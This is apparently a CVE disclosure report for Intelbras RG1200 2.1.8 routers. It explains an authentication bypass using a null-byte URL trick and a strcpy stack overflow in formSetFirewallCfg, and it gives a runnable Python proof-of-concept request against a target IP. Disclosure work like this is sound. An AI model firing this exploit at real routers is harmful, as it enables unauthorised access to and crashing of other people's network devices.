# CVE Report - Authentication Bypass and Stack Buffer Overflow Vulnerability in Intelbras RG1200 2.1.8 Routers (`formSetFirewallCfg`)

## Vulnerability Title

Authentication Bypass and Stack Buffer Overflow Vulnerability in Intelbras RG1200 2.1.8 Routers (`formSetFirewallCfg`)

## Vulnerability Description

Intelbras RG1200 firmware 2.1.8 contains an authentication bypass in the request dispatch chain (`R7WebsSecurityHandler` + `websFormHandler`) caused by inconsistent use of the raw (non-decoded) URL versus the decoded path. Whitelist checks are performed against the raw URL, while the form dispatcher resolves the decoded/truncated path, enabling crafted requests to bypass authentication and reach protected handlers.

After authentication bypass (or with a valid authenticated session), an attacker can trigger a stack buffer overflow in `formSetFirewallCfg`. The handler copies the user-controlled `firewallEn` parameter into a small fixed-size stack buffer using `strcpy` without enforcing an upper bound.

## POC

```py
import requests
import sys


def exploit(target_ip, port=80, cookie="SESSION=<REPLACE>"):
  base = f"http://{target_ip}:{port}"
  url = f"{base}/goform/formSetFirewallCfg%00img/main-logo.png"

  data = {
    "firewallEn": "A" * 100,
    "sip": "0",
  }

  headers = {
    "Cookie": cookie,
  }

  r = requests.post(url, data=data, headers=headers, timeout=10)
  print("status:", r.status_code)
  print(r.text[:2000])


if __name__ == "__main__":
  if len(sys.argv) < 2:
    print("usage: python poc.py <target_ip> [port]")
    sys.exit(1)
  ip = sys.argv[1]
  port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
  exploit(ip, port=port)
```

## Cause Analysis

1. **authentication** : The HTTP request parsing logic stores the raw request URL into `wp->url` (not URL-decoded), while `wp->path` is derived from a decoded buffer produced by `websDecodeUrl` during `websUrlParse`. In `R7WebsSecurityHandler`, the whitelist is checked against the raw URL, while `websFormHandler` dispatches based on the decoded path, allowing crafted requests to bypass authentication and reach a protected `/goform` handler.

2. **stack overflow**: `formSetFirewallCfg` obtains `firewall_value = websGetVar(wp, "firewallEn", ...)` and, after only checking `strlen(firewall_value) >= 4`, executes `strcpy(firewall_buf, firewall_value)` where `firewall_buf` is `char[8]`. Long input overflows the stack buffer.
